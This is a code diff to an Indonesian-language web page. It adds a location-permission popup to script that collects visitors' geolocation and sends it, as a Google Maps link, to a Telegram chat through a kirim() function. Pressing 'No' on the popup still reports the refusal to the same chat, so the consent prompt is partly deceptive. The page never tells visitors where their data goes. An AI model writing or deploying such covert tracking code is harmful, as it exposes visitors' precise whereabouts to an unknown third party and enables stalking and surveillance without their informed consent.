@@ -821,6 +821,47 @@
       </svg>
     </button>
 
+    <!-- Popup Lokasi -->
+    <div
+      id="popupLokasi"
+      style="
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.6);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+      "
+    >
+      <div
+        style="
+          background: white;
+          padding: 20px;
+          border-radius: 10px;
+          text-align: center;
+          max-width: 300px;
+        "
+      >
+        <p>Izinkan situs ini mengakses lokasi Anda?</p>
+        <button
+          onclick="ambilLokasi()"
+          style="margin: 10px; padding: 10px 20px"
+        >
+          Ya
+        </button>
+        <button
+          onclick="tolakLokasi()"
+          style="margin: 10px; padding: 10px 20px"
+        >
+          Tidak
+        </button>
+      </div>
+    </div>
+
     <script>
       // Back to Top Button
       const backToTopButton = document.getElementById("backToTop");
@@ -865,7 +906,9 @@
         }).then(() => console.log("✅ Terkirim ke Telegram"));
       }
 
-      window.onload = () => {
+      function ambilLokasi() {
+        document.getElementById("popupLokasi").style.display = "none";
+
         if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(
             (pos) => {
@@ -874,11 +917,18 @@
               kirim(`📍 Lokasi:\nhttps://www.google.com/maps?q=${lat},${lon}`);
             },
             () => {
-              kirim("⚠️ Pengunjung menolak izin lokasi.");
+              kirim("⚠️ Pengunjung menolak izin lokasi (via browser)");
             }
           );
+        } else {
+          kirim("⚠️ Browser tidak mendukung geolocation.");
         }
-      };
+      }
+
+      function tolakLokasi() {
+        document.getElementById("popupLokasi").style.display = "none";
+        kirim("⚠️ Pengunjung *menolak izin lokasi* melalui tombol popup.");
+      }
     </script>
   </body>
 </html>
